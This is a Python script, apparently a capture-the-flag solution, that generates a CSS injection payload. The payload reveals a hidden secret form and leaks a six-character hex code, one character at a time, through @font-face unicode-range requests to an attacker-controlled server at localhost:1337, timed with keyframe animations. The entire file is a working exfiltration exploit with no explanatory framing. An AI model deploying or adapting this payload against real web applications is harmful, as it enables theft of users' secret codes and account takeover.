import secrets
import random
from urllib.parse import quote


CHARSET = "ABCDEF0987654321" 
URL = "http://localhost:1337"

def generate_fonts_part_2(charset: str) -> str:
    final = ""
    progr = round(100 / len(charset), 2)
    
    for x in range(6): 
        part = ""
        for y, c in enumerate(charset):
            part += f"""    {progr*y}% {{ font-family: rest; }}
    {progr*y + 5}% {{ font-family: has_{x}_{c.upper()}, rest; }}
"""
        final += f"@keyframes trychar_{x} {{\n{part}\n}}\n"

    return final

def generate_set_animation_payload(charset: str) -> str:
    result = ""
    
    for x in range(6):
        result += f"""
.code-digit:nth-child({x+1}) {{
    animation: trychar_{x} step-end 2s 0s;
    animation-iteration-count: 1;
    animation-delay: {x*10+4}s
}}
"""

    return result

def generate_font_face_part(charset: str) -> str:
    font_face_part = ""

    for i in range(6):
        for x in range(len(charset)):

            url_string = ','.join(f"url({URL}/{random.getrandbits(32)}.something?random={random.getrandbits(32)})" for _ in range((x+3)))

            font_face_part += f"""
@font-face{{
    font-family:has_{i}_{charset[x].upper()};
    src: {url_string};
    unicode-range:U+00{hex(ord(charset[x].upper()))[2:]};
}}
    """

    return font_face_part

TEMPLATE = f"""<style>

#secret-form{{
    display: block !important;
}}

{generate_font_face_part(CHARSET)}

{generate_set_animation_payload(CHARSET)}

{generate_fonts_part_2(CHARSET)}

</style>
"""

with open("exploit-css.html", "w") as f:
    f.write(TEMPLATE)